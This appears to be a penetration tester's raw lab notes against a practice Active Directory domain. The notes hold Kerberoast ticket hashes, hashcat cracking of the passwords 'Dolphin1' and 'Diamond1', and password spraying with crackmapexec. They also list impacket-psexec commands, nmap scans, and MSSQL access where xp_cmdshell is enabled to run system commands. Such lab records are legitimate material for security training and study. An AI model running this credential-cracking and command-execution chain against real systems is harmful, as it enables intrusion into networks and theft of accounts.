+--------------------  -------  --------  --------------------------  --------------------------
+MSSQL/MS02.oscp.exam  sql_svc            2022-11-10 03:03:18.456165  2022-11-10 06:15:51.783016             
+HTTP/MS01.oscp.exam   web_svc            2022-11-11 02:11:19.795439  2024-05-10 04:58:01.629873             
+
+[-] CCache file is not found. Skipping...
+$krb5tgs$23$*sql_svc$OSCP.EXAM$oscp.exam/sql_svc*$72ff107852f4f61df544c9016202ec22$0a1d2b3e67d8a9fc7abe85d7ac6310b1fcdea8885a5374064d0d89bc1a504e7743727921cc253d5cf3122a0f43f941768ae8a3d51c364dd0483d1c06434545a9136f3872c61749a5a9338a61ebb99754b08338ec19b21e6d3ac1795116d5a4bbeddda4e80172d581da4befe029368228d7bc935f6a8929995102450a6763aaf24e66fdc5ff857d2bff71e08c72f923cb9cf45859dbc6daf6224bbe9b87097dd840875b15da21b10cdc51c6b34902f021e21abfd636a2118e80e46c336efb56843604dd6474f8babd388106d2ac0a9c821b98056a21a7fce8f1b53c507e7db4424a3d83482ca56c5f238f82f0fabe629d755e43ee82e828550efca31cb98fac01861d3da3081db8fb806b4a496f47008f83bfcf22b0a44eda329e9abc98c06861c4d5af20e939328edd80a4aada6140400dddb281b9e1da38bbba6240974e76c20bee2c6e4734669bd4c3797cff810cbac7813b3f166c3f56a87427815f6ae65b4df66fcd5669d6971e95f7e9f63718ad4ea5fd75bd857f0d681590fcda9cb7f708a1dc763245f6fc33aafd60b896b6cea06bc6588ff405d0687753a29fa081971553c4103e251ec81c0cfa4e9aa16c3e665c57f07003a9305e7551bbffc532c3f719dc1853f34e0ebf892e9e639a87ffac9de1295d8e78defc1bbacf1cbdea174db8c108e4f196af0de884f4760d791a69517ae4ec116869ae0e08a8b090c93ea7069f940477e694f7f21be741f6205889866c26770f2cf44ba5a7cc0417c671016081d800f1b64a4d4f49c2b324d640084c9339ccf7edb83a88abbd3ba3ea619214faea587051372cde510f15cc7eeba4075ed2ea1c3b2b8b901d506c66f7285f56fdebddd9eae50aa11f424b82c15407e67510958420604ae2c9ff96139721e90519543dd61ea1ec10ae8fee9ea9ba5a8ef3f859db7669041aeba44a44de347e82ec7414d9345c9c2c0091a033be9f8378b262dfce4067b5d2d2eba84daf08b225a3cbd65412c1ed5f51d044d3cae36993d6340dfe21859aa37e8f213b57d3fdf87c997e7d78260e615bf7d56a71ce3493844d275bee4e5861b7836828664f108ccc02a486b965691e161ca249ad9d64dd02a2efe7e876766cb9d0f5e2b2ecf5880d90c70f2e1ab7dc2bb2dbf76ed3fbdc6364454c91ba8783fb399e53141908745d74d249a9f2ff82a5d97fdd8da7863e1bb9c36b167855037735b3ef3f205d8b335fc2f4779cdb160d2f85414572ad28ca62eb6d6f35883f1ea154dd514377e2d836d0eace4f6411d343c6f2d6153c91fa0b9a953fbc8841a58105ca2faae750eb8b7ca7803f9f20628122bb9ceb5e4009a490a74a24997c6490077f286a69352d298a57b8f3eb87d6531a6fe92ced2c47f4e0d657d28531e6395f8d4de855
+
+$krb5tgs$23$*web_svc$OSCP.EXAM$oscp.exam/web_svc*$49aefbb1d1db307a1f43e37dfce9ef9f$eb7043462b1acf52872e683cff8297ab10e6ed2e17c627d783b858d6bca8e1f63ef7c1b24f7bdc9ce78e154ff3e1221449805996a069395ce0de919824a8b744d2ff74888d036630de3de49c0417253483c7c848f8250571de864c1d2bd206c36a9d944d263e105e1827ef36558dd491f67d1b1f55a9a9aef3e868891a4e5a9de1c2e4e0c3d8d51f7b922229ef0906636a93e908aad1497ecc2a536158cd7bbbd5acc3c6d6e3d514a7023fd3fc1198afd3a8f21527d5c48a89be6ae9a8c8e98069547abd129b86d7cbc3687ba2f737beb0bdabbf659e6fb4b82e03ec1994a38f63e4214f16ba5c091b36dbf72b5b955e619ef9e6eb87482fca3c22105194bad1176e9f11f8a0d817ed59d494259d82023938c5927b4e3becafb6abaa7e3223cd933f9dae9a455b72dadfde8dbe0a5743150413df9be5b58225a986e2b1594f0b27604be62add12ded51c776b876d8baa0412e1b4e6c0aac108aad7372613b801c50a3c606ac62715c37294ab07928da1dc823ec9d1d0d4e4048c99d1212f8acaf35ed23838804212124999180892b3f4419681861f9eeb7ee221dbe98c2621b67d15ba0ad656b0924350845cc2e0ca521235010fb085cadce0d612d51147395d23823e398f4ecb831f0edd67ac6836b83168e529df2c398d9a0c4456df0688d782ca200f4e234b156dfc46d614c20b18350fd74e308cc42d72159cfa69c445a3b3a141dd17e5d631d9e4843dfa1393db9bb75d90da7cfb69f64e3bc07adda8fc132d8af55ada5f02ec0c0fd6fdb36037e2a5869da4d994ec106ba5b1dce36f3a1d2d93337f540647acf5271b84d32ab9e0fb2ae0d299618f6fef2ca7680c4d8d62b92c351f85d014b8a5ef6e0ca8a0784faa397dd39967b8f11b1c31679b2dcc3fb6b6dc881d7de06e5bfeaee56cbdc97d23cdd5a8c26ff4b721115f701ec722479124cc222affc5539b1745d6e554ddb796d442ddf94ef298677228d07b8da645d5e76ee5fe4b6d378994f3b13b10289bb5d6d41170af9c562f6d10141ff264dbba072b4753aff7904ae6e2c24fcd40574ecce49c8a2b6b6871102ae999a2aa829861296d59f67ffc97e77d52980ecd6c1900dfc6a2ba906e65b4b9561d0dc93515e32204208530df30f0d2ffbac03c675621bafa47353aa74b31081f8584e29db68342388d90c1c89f0030e70ee0e4588ace585bba28db604a85d4c512d3950e8777447ec2ace1cd7e20eb2e9c03351fa06a54d39e65d755b0977c0ea2bf24686b2540b8fb0621434323acf44eaf0d9e2feb7bf800bf4071179d8366113cfad463af02d8f99eaaba3d16330189108b3c2407fb38fc19d2c9398c796a5352d09341cd4971356204de339d8da8abdd4265686fc9a4f674da530d3888490e72321a
+
+┌──(kali㉿kali)-[~/Desktop/B/147]
+└─$ nano sql_svc.hash
+
+kali@kali:~$ sudo hashcat -m 13100 sql_svc.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+Dolphin1                                                 
+Session..........: hashcat
+Status...........: Cracked
+
+				SPRAY AND PRAY: 
+web_svc:Diamond1
+sql_svc:Dolphin1 
+
+10.10.174.146 
+10.10.174.148
+
+┌──(kali㉿kali)-[~]
+└─$ crackmapexec smb 10.10.174.146 -u web_svc -p 'Diamond1' -d oscp.exam --shares
+SMB         10.10.174.146   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:oscp.exam) (signing:True) (SMBv1:False)
+SMB         10.10.174.146   445    DC01             [+] oscp.exam\web_svc:Diamond1 
+SMB         10.10.174.146   445    DC01             [+] Enumerated shares
+SMB         10.10.174.146   445    DC01             Share           Permissions     Remark
+SMB         10.10.174.146   445    DC01             -----           -----------     ------
+SMB         10.10.174.146   445    DC01             ADMIN$                          Remote Admin
+SMB         10.10.174.146   445    DC01             C$                              Default share
+SMB         10.10.174.146   445    DC01             IPC$            READ            Remote IPC
+SMB         10.10.174.146   445    DC01             NETLOGON        READ            Logon server share 
+SMB         10.10.174.146   445    DC01             SYSVOL          READ            Logon server share 
+SMB         10.10.174.146   445    DC01             Users           READ   
+
+┌──(kali㉿kali)-[~]
+└─$ crackmapexec smb 10.10.174.148 -u web_svc -p 'Diamond1' -d oscp.exam --shares
+SMB         10.10.174.148   445    MS02             [*] Windows 10 / Server 2019 Build 19041 x64 (name:MS02) (domain:oscp.exam) (signing:False) (SMBv1:False)
+SMB         10.10.174.148   445    MS02             [+] oscp.exam\web_svc:Diamond1 
+SMB         10.10.174.148   445    MS02             [+] Enumerated shares
+SMB         10.10.174.148   445    MS02             Share           Permissions     Remark
+SMB         10.10.174.148   445    MS02             -----           -----------     ------
+SMB         10.10.174.148   445    MS02             ADMIN$                          Remote Admin
+SMB         10.10.174.148   445    MS02             C$                              Default share
+SMB         10.10.174.148   445    MS02             IPC$            READ            Remote IPC
+
+┌──(kali㉿kali)-[~]
+└─$ crackmapexec winrm 10.10.174.146 -u web_svc -p 'Diamond1' -d oscp.exam --continue-on-success
+HTTP        10.10.174.146   5985   10.10.174.146    [*] http://10.10.174.146:5985/wsman
+WINRM       10.10.174.146   5985   10.10.174.146    [-] oscp.exam\web_svc:Diamond1
+
+┌──(kali㉿kali)-[~]
+└─$ crackmapexec winrm 10.10.174.148 -u web_svc -p 'Diamond1' -d oscp.exam --continue-on-success
+HTTP        10.10.174.148   5985   10.10.174.148    [*] http://10.10.174.148:5985/wsman
+WINRM       10.10.174.148   5985   10.10.174.148    [-] oscp.exam\web_svc:Diamond1
+                                                                                     
+
+
+┌──(kali㉿kali)-[~]
+└─$ crackmapexec smb 10.10.174.146 -u sql_svc -p 'Dolphin1' -d oscp.exam --shares
+SMB         10.10.174.146   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:oscp.exam) (signing:True) (SMBv1:False)
+SMB         10.10.174.146   445    DC01             [+] oscp.exam\sql_svc:Dolphin1 
+SMB         10.10.174.146   445    DC01             [+] Enumerated shares
+SMB         10.10.174.146   445    DC01             Share           Permissions     Remark
+SMB         10.10.174.146   445    DC01             -----           -----------     ------
+SMB         10.10.174.146   445    DC01             ADMIN$                          Remote Admin
+SMB         10.10.174.146   445    DC01             C$                              Default share
+SMB         10.10.174.146   445    DC01             IPC$            READ            Remote IPC
+SMB         10.10.174.146   445    DC01             NETLOGON        READ            Logon server share                                                                                            
+SMB         10.10.174.146   445    DC01             SYSVOL          READ            Logon server share                                                                                            
+SMB         10.10.174.146   445    DC01             Users           READ 
+
+┌──(kali㉿kali)-[~]
+└─$ crackmapexec smb 10.10.174.148 -u sql_svc -p 'Dolphin1' -d oscp.exam --shares
+SMB         10.10.174.148   445    MS02             [*] Windows 10 / Server 2019 Build 19041 x64 (name:MS02) (domain:oscp.exam) (signing:False) (SMBv1:False)
+SMB         10.10.174.148   445    MS02             [+] oscp.exam\sql_svc:Dolphin1 
+SMB         10.10.174.148   445    MS02             [+] Enumerated shares
+SMB         10.10.174.148   445    MS02             Share           Permissions     Remark
+SMB         10.10.174.148   445    MS02             -----           -----------     ------
+SMB         10.10.174.148   445    MS02             ADMIN$                          Remote Admin
+SMB         10.10.174.148   445    MS02             C$                              Default share
+SMB         10.10.174.148   445    MS02             IPC$            READ            Remote IPC
+
+┌──(kali㉿kali)-[~]
+└─$ crackmapexec winrm 10.10.174.146 -u sql_svc -p 'Dolphin1' -d oscp.exam --continue-on-success
+HTTP        10.10.174.146   5985   10.10.174.146    [*] http://10.10.174.146:5985/wsman
+WINRM       10.10.174.146   5985   10.10.174.146    [-] oscp.exam\sql_svc:Dolphin1
+
+┌──(kali㉿kali)-[~]
+└─$ crackmapexec winrm 10.10.174.148 -u sql_svc -p 'Dolphin1' -d oscp.exam --continue-on-success
+HTTP        10.10.174.148   5985   10.10.174.148    [*] http://10.10.174.148:5985/wsman
+WINRM       10.10.174.148   5985   10.10.174.148    [-] oscp.exam\sql_svc:Dolphin1
+
+
+				ACCESS: not writable.
+impacket-psexec web_svc:Diamond1@10.10.174.146 cmd.exe
+impacket-psexec sql_svc:Dolphin1@10.10.174.146 cmd.exe
+
+impacket-psexec sql_svc:Dolphin1@10.10.174.148 cmd.exe
+impacket-psexec web_svc:Diamond1@10.10.174.148 cmd.exe
+
+
+--------------------------------------------------------------------------------------------------
+				DC: 10.10.174.146 
+┌──(kali㉿kali)-[~]
+└─$ nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- 10.10.174.146  
+
+53/tcp    open  domain        syn-ack Simple DNS Plus
+88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2024-05-10 09:57:28Z)
+135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
+139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
+389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: oscp.exam0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds? syn-ack
+464/tcp   open  kpasswd5?     syn-ack
+593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped    syn-ack
+3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: oscp.exam0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped    syn-ack
+5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
+49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49676/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
+49678/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49708/tcp open  msrpc         syn-ack Microsoft Windows RPC
+50702/tcp open  msrpc         syn-ack Microsoft Windows RPC
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 16865/tcp): CLEAN (Timeout)
+|   Check 2 (port 19340/tcp): CLEAN (Timeout)
+|   Check 3 (port 21668/udp): CLEAN (Timeout)
+|   Check 4 (port 30283/udp): CLEAN (Timeout)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb2-time: 
+|   date: 2024-05-10T09:58:24
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+| nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:ab:70:ab (VMware)
+| Names:
+|   DC01<00>             Flags: <unique><active>
+|   DC01<20>             Flags: <unique><active>
+|   OSCP<00>             Flags: <group><active>
+|   OSCP<1c>             Flags: <group><active>
+|   OSCP<1b>             Flags: <unique><active>
+| Statistics:
+|   00:50:56:ab:70:ab:00:00:00:00:00:00:00:00:00:00:00
+|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
+|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
+|_clock-skew: 0s
+
+
+
+--------------------------------------------------------------------------------------------------
+				MS02: 10.10.174.148
+┌──(kali㉿kali)-[~]
+└─$ nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- 10.10.174.148
+
+???: 
+5040/tcp  open  unknown       syn-ack
+
+HTTP: 5985 47001
+5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+
+
+MSSQL: 
+1433/tcp  open  ms-sql-s      syn-ack Microsoft SQL Server 2019 15.00.2000.00; RTM
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Issuer: commonName=SSL_Self_Signed_Fallback
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2024-03-30T04:06:17
+| Not valid after:  2054-03-30T04:06:17
+| MD5:   e42d:b78c:fb21:a040:3d83:45ef:3ab6:34fb
+| SHA-1: 8e6e:674f:9f48:158e:ec62:3040:984a:d6ac:f642:ca69
+| ms-sql-ntlm-info: 
+|   10.10.174.148:1433: 
+|     Target_Name: OSCP
+|     NetBIOS_Domain_Name: OSCP
+|     NetBIOS_Computer_Name: MS02
+|     DNS_Domain_Name: oscp.exam
+|     DNS_Computer_Name: MS02.oscp.exam
+|     DNS_Tree_Name: oscp.exam
+|_    Product_Version: 10.0.19041
+|_ssl-date: 2024-05-10T11:03:44+00:00; 0s from scanner time.
+| ms-sql-info: 
+|   10.10.174.148:1433: 
+|     Version: 
+|       name: Microsoft SQL Server 2019 RTM
+|       number: 15.00.2000.00
+|       Product: Microsoft SQL Server 2019
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+
+MSSQL: 
+49700/tcp open  ms-sql-s      syn-ack Microsoft SQL Server 2019 15.00.2000.00; RTM
+|_ssl-date: 2024-05-10T11:03:44+00:00; 0s from scanner time.
+| ms-sql-info: 
+|   10.10.174.148:49700: 
+|     Version: 
+|       name: Microsoft SQL Server 2019 RTM
+|       number: 15.00.2000.00
+|       Product: Microsoft SQL Server 2019
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 49700
+| ms-sql-ntlm-info: 
+|   10.10.174.148:49700: 
+|     Target_Name: OSCP
+|     NetBIOS_Domain_Name: OSCP
+|     NetBIOS_Computer_Name: MS02
+|     DNS_Domain_Name: oscp.exam
+|     DNS_Computer_Name: MS02.oscp.exam
+|     DNS_Tree_Name: oscp.exam
+|_    Product_Version: 10.0.19041
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Issuer: commonName=SSL_Self_Signed_Fallback
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2024-03-30T04:06:17
+| Not valid after:  2054-03-30T04:06:17
+| MD5:   e42d:b78c:fb21:a040:3d83:45ef:3ab6:34fb
+| SHA-1: 8e6e:674f:9f48:158e:ec62:3040:984a:d6ac:f642:ca69
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+MSRPC: 
+135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
+49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49670/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49671/tcp open  msrpc         syn-ack Microsoft Windows RPC
+
+SMB: 
+139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds? syn-ack
+Host script results:
+| nbstat: NetBIOS name: MS02, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:ab:89:c4 (VMware)
+| Names:
+|   MS02<00>             Flags: <unique><active>
+|   OSCP<00>             Flags: <group><active>
+|   MS02<20>             Flags: <unique><active>
+| Statistics:
+|   00:50:56:ab:89:c4:00:00:00:00:00:00:00:00:00:00:00
+|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
+|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 64202/tcp): CLEAN (Timeout)
+|   Check 2 (port 12755/tcp): CLEAN (Timeout)
+|   Check 3 (port 64694/udp): CLEAN (Timeout)
+|   Check 4 (port 32607/udp): CLEAN (Timeout)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb2-time: 
+|   date: 2024-05-10T11:03:04
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+|_clock-skew: mean: 0s, deviation: 0s, median: 0s
+
+
+				SMB: 
+┌──(kali㉿kali)-[~]
+└─$ crackmapexec smb 10.10.174.148 -u sql_svc -p 'Dolphin1' -d oscp.exam --shares
+SMB         10.10.174.148   445    MS02             [*] Windows 10 / Server 2019 Build 19041 x64 (name:MS02) (domain:oscp.exam) (signing:False) (SMBv1:False)
+SMB         10.10.174.148   445    MS02             [+] oscp.exam\sql_svc:Dolphin1 
+SMB         10.10.174.148   445    MS02             [+] Enumerated shares
+SMB         10.10.174.148   445    MS02             Share           Permissions     Remark
+SMB         10.10.174.148   445    MS02             -----           -----------     ------
+SMB         10.10.174.148   445    MS02             ADMIN$                          Remote Admin
+SMB         10.10.174.148   445    MS02             C$                              Default share
+SMB         10.10.174.148   445    MS02             IPC$            READ            Remote IPC
+
+┌──(kali㉿kali)-[~]
+└─$ crackmapexec smb 10.10.174.148 -u web_svc -p 'Diamond1' -d oscp.exam --shares
+SMB         10.10.174.148   445    MS02             [*] Windows 10 / Server 2019 Build 19041 x64 (name:MS02) (domain:oscp.exam) (signing:False) (SMBv1:False)
+SMB         10.10.174.148   445    MS02             [+] oscp.exam\web_svc:Diamond1 
+SMB         10.10.174.148   445    MS02             [+] Enumerated shares
+SMB         10.10.174.148   445    MS02             Share           Permissions     Remark
+SMB         10.10.174.148   445    MS02             -----           -----------     ------
+SMB         10.10.174.148   445    MS02             ADMIN$                          Remote Admin
+SMB         10.10.174.148   445    MS02             C$                              Default share
+SMB         10.10.174.148   445    MS02             IPC$            READ            Remote IPC
+
+ACCESS: not writable.
+impacket-psexec sql_svc:Dolphin1@10.10.116.148 cmd.exe
+impacket-psexec web_svc:Diamond1@10.10.116.148 cmd.exe
+
+
+				READ: IPC$
+impacket-smbclient sql_svc@10.10.116.148
+Dolphin1
+
+impacket-smbclient web_svc@10.10.116.148
+Diamond1
+
+# help
+# shares
+ADMIN$
+C$
+IPC$
+# use IPC$
+# ls
+-rw-rw-rw-          3  Sun Dec 31 19:03:58 1600 InitShutdown
+-rw-rw-rw-          4  Sun Dec 31 19:03:58 1600 lsass
+-rw-rw-rw-          3  Sun Dec 31 19:03:58 1600 ntsvcs
+-rw-rw-rw-          3  Sun Dec 31 19:03:58 1600 scerpc
+-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 Winsock2\CatalogChangeListener-2a4-0
+-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 Winsock2\CatalogChangeListener-384-0
+-rw-rw-rw-          3  Sun Dec 31 19:03:58 1600 epmapper
+-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 Winsock2\CatalogChangeListener-218-0
+-rw-rw-rw-          3  Sun Dec 31 19:03:58 1600 LSM_API_service
+-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 Winsock2\CatalogChangeListener-3b4-0
+-rw-rw-rw-          3  Sun Dec 31 19:03:58 1600 atsvc
+-rw-rw-rw-          3  Sun Dec 31 19:03:58 1600 eventlog
+-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 Winsock2\CatalogChangeListener-53c-0
+-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 Winsock2\CatalogChangeListener-4f4-0
+-rw-rw-rw-          3  Sun Dec 31 19:03:58 1600 spoolss
+-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 Winsock2\CatalogChangeListener-89c-0
+-rw-rw-rw-          4  Sun Dec 31 19:03:58 1600 wkssvc
+-rw-rw-rw-          3  Sun Dec 31 19:03:58 1600 trkwks
+-rw-rw-rw-          4  Sun Dec 31 19:03:58 1600 srvsvc
+-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 vgauth-service
+-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 Winsock2\CatalogChangeListener-974-0
+-rw-rw-rw-          3  Sun Dec 31 19:03:58 1600 ROUTER
+-rw-rw-rw-          3  Sun Dec 31 19:03:58 1600 W32TIME_ALT
+-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 Winsock2\CatalogChangeListener-298-0
+-rw-rw-rw-          3  Sun Dec 31 19:03:58 1600 SQLLocal\SQLEXPRESS
+-rw-rw-rw-          2  Sun Dec 31 19:03:58 1600 MSSQL$SQLEXPRESS\sql\query
+-rw-rw-rw-          4  Sun Dec 31 19:03:58 1600 MsFteWds
+-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 SearchTextHarvester
+-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER
+-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 ProtectedPrefix\LocalService\FTHPIPE
+
+# get SearchTextHarvester
+[-] SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
+
+
+				HTTP: 
+http://10.10.174.148:47001/
+http://10.10.174.148:5985/
+
+NMAP:
+|     Target_Name: OSCP
+|     NetBIOS_Domain_Name: OSCP
+|     NetBIOS_Computer_Name: MS02
+|     DNS_Domain_Name: oscp.exam
+|     DNS_Computer_Name: MS02.oscp.exam
+|     DNS_Tree_Name: oscp.exam
+
+┌──(kali㉿kali)-[~]
+└─$ sudo nano /etc/hosts
+10.10.174.148	MS02.oscp.exam
+
+http://MS02.oscp.exam:47001/
+http://MS02.oscp.exam:5985/
+
+				MSSQL: 
+sql_svc
+10.10.116.148
+Dolphin1
+
+┌──(kali㉿kali)-[~]
+└─$ impacket-mssqlclient sql_svc:Dolphin1@10.10.116.148 -windows-auth
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(MS02\SQLEXPRESS): Line 1: Changed database context to 'master'.
+[*] INFO(MS02\SQLEXPRESS): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
+[!] Press help for extra shell commands
+SQL (OSCP\sql_svc  dbo@master)> 
+
+SQL (OSCP\sql_svc  dbo@master)> SELECT @@version;
+Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) 
+        Sep 24 2019 13:48:23 
+        Copyright (C) 2019 Microsoft Corporation
+        Express Edition (64-bit) on Windows 10 Pro 10.0 <X64> (Build 19042: ) (Hypervisor)
+
+
+			Enabling xp_cmdshell feature::
+SQL> EXEC sp_configure 'show advanced options', '1'
+SQL> RECONFIGURE
+SQL> EXEC sp_configure 'xp_cmdshell', '1'
+SQL> exec xp_cmdshell "whoami"
+
+SQL (OSCP\sql_svc  dbo@master)> EXECUTE sp_configure 'show advanced options', 1;
+[*] INFO(MS02\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL (OSCP\sql_svc  dbo@master)> RECONFIGURE;
+SQL (OSCP\sql_svc  dbo@master)> EXECUTE sp_configure 'xp_cmdshell', 1;
+[*] INFO(MS02\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL (OSCP\sql_svc  dbo@master)> RECONFIGURE;
+SQL (OSCP\sql_svc  dbo@master)> EXECUTE xp_cmdshell 'whoami';
+output                        
+---------------------------   
+nt service\mssql$sqlexpress
+NULL    
+
+			# REVERSE SHELL DIDNT WORK #
+
+			NETWORK: ms02 has no route to 192.xxx
+type route print in your shell of ms02 
+
+SQL (OSCP\sql_svc  dbo@master)> EXECUTE xp_cmdshell 'ipconfig';
+output                                                 
+----------------------------------------------------   
+NULL                                                   
+Windows IP Configuration                               
+NULL                                                   
+NULL                                                   
+Ethernet adapter Ethernet0:                            
+NULL                                                   
+   Connection-specific DNS Suffix  . :                 
+   IPv4 Address. . . . . . . . . . . : 10.10.116.148   
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0   
+   Default Gateway . . . . . . . . . : 10.10.116.254   
+
+
+SQL (OSCP\sql_svc  dbo@master)> EXECUTE xp_cmdshell 'route print';
+output                                                                        
+Interface List                                                                
+  6...00 50 56 ab e1 1d ......vmxnet3 Ethernet Adapter                        
+  1...........................Software Loopback Interface 1                   
+===========================================================================   
+NULL                                                                          
+IPv4 Route Table                                                              
+===========================================================================   
+Active Routes:                                                                
+Network Destination        Netmask          Gateway       Interface  Metric   
+          0.0.0.0          0.0.0.0    10.10.116.254    10.10.116.148     16   
+      10.10.116.0    255.255.255.0         On-link     10.10.116.148    271   
+    10.10.116.148  255.255.255.255         On-link     10.10.116.148    271   
+    10.10.116.255  255.255.255.255         On-link     10.10.116.148    271   
+        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331   
+        127.0.0.1  255.255.255.255         On-link         127.0.0.1    331   
+  127.255.255.255  255.255.255.255         On-link         127.0.0.1    331   
+        224.0.0.0        240.0.0.0         On-link         127.0.0.1    331   
+        224.0.0.0        240.0.0.0         On-link     10.10.116.148    271   
+  255.255.255.255  255.255.255.255         On-link         127.0.0.1    331   
+  255.255.255.255  255.255.255.255         On-link     10.10.116.148    271   
+===========================================================================   
+Persistent Routes:                                                            
+  Network Address          Netmask  Gateway Address  Metric                   
+          0.0.0.0          0.0.0.0    10.10.116.254       1                   
+===========================================================================   
+NULL                                                                          
+IPv6 Route Table                                                              
+===========================================================================   
+Active Routes:         
+ If Metric Network Destination      Gateway         
+  1    331 ::1/128                  On-link                            
+  1    331 ff00::/8                 On-link                                   
+===========================================================================   
+Persistent Routes:                                                            
+  None                                                                        
+NULL    
+
+SQL (OSCP\sql_svc  dbo@master)> EXECUTE xp_cmdshell 'arp -A';
+output                                                     
+--------------------------------------------------------   
+NULL
+Interface: 10.10.116.148 --- 0x6                           
+  Internet Address      Physical Address      Type         
+  10.10.116.146         00-50-56-ab-f3-c6     dynamic      
+  10.10.116.147         00-50-56-ab-4a-9a     dynamic      
+  10.10.116.255         ff-ff-ff-ff-ff-ff     static       
+  224.0.0.22            01-00-5e-00-00-16     static       
+  224.0.0.251           01-00-5e-00-00-fb     static       
+  239.255.255.250       01-00-5e-7f-ff-fa     static       
+NULL   
+
+SQL (OSCP\sql_svc  dbo@master)> EXECUTE xp_cmdshell 'nslookup';
+output                       
+--------------------------   
+DNS request timed out.       
+    timeout was 2 seconds.   
+Default Server:  UnKnown     
+Address:  10.10.116.146      
+NULL   
+
+				# SET UP LISTENER:
+SQL (OSCP\sql_svc  dbo@master)> EXECUTE xp_cmdshell 'arp -A';
+  Internet Address      Physical Address      Type         
+  10.10.116.146         00-50-56-ab-f3-c6     dynamic      
+  10.10.116.147         00-50-56-ab-4a-9a     dynamic      
